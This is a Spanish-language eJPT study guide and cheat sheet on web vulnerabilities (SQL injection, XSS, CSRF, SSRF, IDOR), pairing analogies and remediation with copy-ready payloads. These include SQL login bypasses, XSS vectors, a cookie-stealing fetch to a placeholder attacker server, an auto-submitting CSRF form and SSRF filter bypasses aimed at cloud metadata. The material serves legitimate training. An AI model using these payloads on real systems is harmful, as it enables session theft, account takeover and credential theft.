<div align="center">

#  WEB APPLICATION VULNERABILITIES
### *Manual Dual: Guía Didáctica y Cheat Sheet de Examen / Trabajo (eJPT)*

![eJPT Logo](https://img.shields.io/badge/eJPTv2-eLearnSecurity_Junior_Penetration_Tester-red?style=for-the-badge&logo=shield)
![OWASP](https://img.shields.io/badge/OWASP-Top_Web_Vulnerabilities-blue?style=for-the-badge)

---

</div>

> **Propósito de esta guía:**
> 1. **⚡ Durante Examen / Trabajo:** Matriz de consulta ultrarrápida, vectores de detección y payloads listos para copiar/pegar.
> 2. **🎓 Durante una Clase / Explicación:** Estructura conceptual con analogías de la vida real para explicar desde 0 a cualquier persona.

---

## 🚀 Matriz de Resumen Rápido (Cheat Sheet de Consulta Express)

| Vulnerabilidad | Dónde buscar (Vector) | Payload / Prueba Rápida | Indicador de Éxito |
| :--- | :--- | :--- | :--- |
| **SQLi** | Parámetros URL (`?id=1`), Formularios de login, búsquedas. | `'` &#124; `"`, `' OR 1=1;--`, `UNION SELECT 1,2,3--` | Errores SQL, bypass de login, datos de otras tablas en pantalla. |
| **XSS** | Campos de texto, comentarios, parámetros reflejados en HTML. | `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>` | Ejecución de alerta JavaScript o pop-up en el navegador. |
| **CSRF** | Formulación de cambio de contraseña, email, perfil sin token. | Formulario HTML oculto con envío automático JS (`POST`/`GET`). | Acción realizada sin consentimiento de la víctima autenticada. |
| **SSRF** | Funciones que reciben URLs/archivos (`?url=`, `?file=`, webhooks). | `http://127.0.0.1`, `http://169.254.169.254` (Metadata Cloud) | Acceso a interfaces internas, respuestas de red local o AWS/GCP. |
| **IDOR** | Parámetros de ID (`?user_id=105`), rutas REST (`/api/users/105`). | Cambiar ID (`105` $\rightarrow$ `106`), decodificar Base64, probar Cuenta B. | Acceso o modificación de datos pertenecientes a otro usuario. |

---

## 1. SQL Injection (SQLi) – Inyección SQL

### 🎓 Concepto y Analogía (Para Enseñar desde Cero)
* **Analogía:** Vas a la ventanilla de un banco y entregas una planilla que pide tu nombre. En lugar de escribir solo *"Juan"*, escribes *"Juan y regálale 1.000€ a quien lea esto"*. Si el cajero lee la orden completa y la ejecuta al pie de la letra sin verificar, has realizado una inyección.
* **Qué ocurre técnicamente:** Ocurre cuando la aplicación toma entradas del usuario y las concatena directamente dentro de una consulta SQL hacia la base de datos sin sanearlas. Esto permite alterar la lógica de la consulta e interactuar con la base de datos sin autorización.
* **Causa Raíz:** Concatena datos directamente en cadenas de código SQL.

### 🔍 Tipos de SQLi
1. **In-Band (En Banda - Resultado visible en pantalla):**
   * **Basada en Errores:** La base de datos muestra mensajes de error técnicos que revelan tablas, columnas o datos.
   * **Basada en UNION:** Usa el operador `UNION` para combinar la consulta legítima con un `SELECT` del atacante y extraer información.
2. **Blind (Ciega - Sin salida visible en pantalla):**
   * **Bypass de Autenticación:** Fuerza condiciones verdaderas (ej. `' OR 1=1;--`) para omitir la validación de contraseña.
   * **Basada en Booleanos:** Se hacen preguntas de Sí/No midiendo cambios sutiles en la respuesta de la web.
   * **Basada en Tiempo:** Inyecta retardos (ej. `SLEEP(5)`) y mide el tiempo de respuesta del servidor.
3. **Out-of-Band (OOB - Fuera de Banda):** Fuerza a la base de datos a realizar solicitudes externas HTTP o DNS hacia un servidor del atacante (ej. `LOAD_FILE()` en MySQL o `xp_dirtree` en MSSQL).

### ⚡ Cheat Sheet de Explotación Rápida (Examen / Trabajo)
* **Detección:** Probar `'`, `"`, `;--` en campos de entrada o parámetros URL.
* **Bypass de Login:**
  ```sql
  ' OR 1=1;--
  admin'--
  " OR "1"="1
  ```
* **Metodología Paso a Paso para UNION SQLi:**
  1. **Contar columnas:** `UNION SELECT 1,2,3--` (incrementar números hasta no recibir error).
  2. **Encontrar columna reflejada:** `0 UNION SELECT 1,2,3--` (usar ID inexistente como `0` para ver qué número se imprime en pantalla).
  3. **Obtener nombre de la BD:** `0 UNION SELECT 1,database(),3--`.
  4. **Enumerar tablas y columnas:** Consultar `information_schema.tables` e `information_schema.columns`.

### 🛡️ Remediación
* **Consultas Preparadas (Sentencias Parametrizadas):** Separan físicamente la estructura SQL de los datos del usuario.
* Validación estricta con listas de permitidos (Allow lists) y Principio de Mínimo Privilegio.

---

## 2. Cross-Site Scripting (XSS) – Script en Sitios Cruzados

### 🎓 Concepto y Analogía (Para Enseñar desde Cero)
* **Analogía:** Dejas un cartel en un tablón de anuncios público. En lugar de texto normal, usas una "tinta mágica" (código JavaScript). Cuando cualquier otra persona lee el cartel, la tinta mágica se activa y le obliga a entregarte las llaves de su casa sin que se dé cuenta.
* **Qué ocurre técnicamente:** La aplicación recibe datos del usuario y los imprime en la página web sin filtrarlos ni codificarlos, permitiendo la ejecución de JavaScript en el navegador de la víctima.
* **Causa Raíz:** El navegador interpreta entradas de usuario como código ejecutable HTML/JS en lugar de texto plano.

### 🔍 Tipos de XSS
1. **Reflejado (Reflected):** El payload viene en la solicitud (ej. parámetro URL) y se refleja inmediatamente en la respuesta. Requiere que la víctima haga clic en un enlace.
2. **Almacenado (Stored / Persistente):** El payload se guarda en la base de datos (ej. comentarios o biografía) y se ejecuta en el navegador de **todos** los usuarios que visiten la página.
3. **Basado en DOM (DOM-Based):** Sucede completamente en el cliente. El JavaScript de la página lee datos vulnerables del navegador (`location.hash`, URL) y los escribe de forma insegura (ej. mediante `innerHTML`).
4. **Ciego (Blind XSS):** El payload se guarda pero se ejecuta en un panel interno fuera de la vista del atacante (ej. panel de soporte de administradores).

### ⚡ Cheat Sheet de Explotación Rápida (Examen / Trabajo)
* **PoC Básica:** `<script>alert('XSS')</script>`
* **Escapar de atributo HTML (`<input value="...">`):** `"> <script>alert('THM')</script>`
* **Escapar de un bloque `<textarea>`:** `</textarea><script>alert('THM')</script>`
* **Dentro de código JavaScript existente:** `';alert('THM');//`
* **Bypass de etiquetas `<script>` usando eventos:**
  ```html
  <img src="x" onerror="alert(1)">
  <svg onload="alert(1)">
  ```
* **Payload para Robo de Cookies de Sesión:**
  ```javascript
  fetch('http://SERVIDOR-ATACANTE/?cookie=' + btoa(document.cookie))
  ```

### 🛡️ Remediación
* **Escapado / Codificación de Salida (Output Encoding):** Convertir caracteres especiales como `<` a `&lt;`.
* **Cookie Flag `HttpOnly`:** Impide que JavaScript acceda a las cookies de sesión.

---

## 3. Cross-Site Request Forgery (CSRF) – Falsificación de Solicitudes

### 🎓 Concepto y Analogía (Para Enseñar desde Cero)
* **Analogía:** Estás en el banco atendido en ventanilla. Alguien en la calle te pasa un folleto. Al abrirlo, sin darte cuenta, entregas una orden firmada por ti al cajero para que transfiera dinero a otra cuenta.
* **Qué ocurre técnicamente:** Engaña al navegador de un usuario autenticado para que envíe una solicitud no deseada a un sitio web donde la víctima tiene una sesión activa.
* **Causa Raíz:** El navegador envía automáticamente las **cookies de sesión** en cada solicitud dirigida al dominio de destino, y el servidor no verifica el origen real de la petición.

### 📋 Requisitos para que exista CSRF
1. Víctima **autenticada** en la aplicación.
2. La acción debe ser **relevante / cambiar un estado** (ej. cambiar email, contraseña, transferir fondos).
3. Ausencia de mecanismos de verificación de origen (Tokens impredecibles).

### ⚡ Cheat Sheet de Explotación Rápida (Examen / Trabajo)
* **PoC Formulario HTML Oculto (POST / GET):**
  ```html
  <form action="http://sitio-vulnerable.com/settings" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
  ```

### 🛡️ Remediación
* **Tokens Anti-CSRF:** Claves aleatorias, asociadas a la sesión, requeridas en cada formulario.
* Atributo de Cookie **`SameSite=Strict`** o **`SameSite=Lax`**.

---

## 4. Server-Side Request Forgery (SSRF) – Falsificación de Solicitudes en el Servidor

### 🎓 Concepto y Analogía (Para Enseñar desde Cero)
* **Analogía:** Le pides al mensajero de una empresa que vaya a la oficina del director (a la que tú no tienes acceso) y te traiga documentos de su escritorio. Como el mensajero es un empleado de confianza, los guardias lo dejan pasar sin hacer preguntas.
* **Qué ocurre técnicamente:** Ocurre cuando el servidor backend recibe una URL o dirección enviada por el usuario y realiza la petición HTTP directamente desde su propia red interna.
* **Causa Raíz:** Confianza implícita en las peticiones que se originan dentro del propio servidor o red privada.

### 🔍 Tipos e Impacto
* **SSRF Regular (Visible):** La respuesta del servidor interno se muestra al atacante.
* **SSRF Ciego (Blind SSRF):** La petición se realiza pero la respuesta no es visible; requiere confirmación mediante un servidor externo (OOB) o análisis de tiempo.
* **Impacto:** Acceso a paneles internos, escaneo de red privada y extracción de credenciales en la nube mediante metadatos (`169.254.169.254` en AWS/GCP/Azure).

### ⚡ Cheat Sheet de Bypasses Comunes (Examen / Trabajo)
* **Bypass de filtros `127.0.0.1` / `localhost`:**
  * IP Abreviada / Cero: `http://127.1` &#124; `http://0` &#124; `http://0.0.0.0`
  * Decimal / Octal: `http://2130706433`
  * DNS Comodín: `http://127.0.0.1.nip.io`
  * IPv6: `http://[::1]`
* **Uso del carácter `@`:** `https://sitio-permitido.com@attacker.com/`
* **Path Traversal:** `/../admin`
* **Metadatos AWS Cloud:** `http://169.254.169.254/latest/meta-data/`

### 🛡️ Remediación
* **Listas de permitidos (Allow lists)** estrictas para dominios e IP permitidos.
* Validar y parsear adecuadamente las URLs; deshabilitar redirecciones HTTP automáticas.

---

## 5. Insecure Direct Object Reference (IDOR) – Referencias Directas Inseguras a Objetos

### 🎓 Concepto y Analogía (Para Enseñar desde Cero)
* **Analogía:** Llegas a un hotel y te dan la llave de la habitación 105. Pruebas la llave en la habitación 106 y la puerta se abre de par en par, permitiéndote ver los objetos de otro huésped.
* **Qué ocurre técnicamente:** Ocurre cuando una aplicación utiliza un identificador directo (ej. `user_id=105`) para acceder a un recurso sin verificar si el usuario que hace la solicitud tiene autorización sobre ese objeto.
* **Causa Raíz:** Confundir **Autenticación** (saber quién eres) con **Autorización** (verificar si tienes permiso para acceder al objeto específico).

### 🔍 Tipos de Identificadores y Técnicas
1. **Secuenciales:** `?user_id=105` $\rightarrow$ Probar `106`, `100`, `1`.
2. **Codificados (Base64):** `eyJ1c2VyX2lkIjogNX0=` $\rightarrow$ Decodificar $\rightarrow$ Cambiar ID $\rightarrow$ Recodificar $\rightarrow$ Enviar.
3. **Hasheados (MD5/SHA-1):** Si el ID es `md5(100)`, calcular `md5(101)` e inyectar.
4. **UUIDs / Impredecibles:** Aplicar la **técnica de dos cuentas** (obtener el UUID del usuario A e intentar consumirlo estando autenticado como usuario B).

### ⚡ Dónde probar IDOR durante un Examen
* Parámetros en URL y endpoints REST (`/api/users/123/orders`).
* Cuerpo de solicitudes POST/PUT/JSON (`{"user_id": 123}`).
* Encabezados HTTP, Cookies y parámetros no documentados (Parameter Mining).

### 🛡️ Remediación
* Verificaciones explícitas de **autorización a nivel de objeto** en el servidor para cada solicitud (*"¿Este usuario es el dueño de este recurso?"*).
* Implementar control de acceso basado en roles (RBAC).
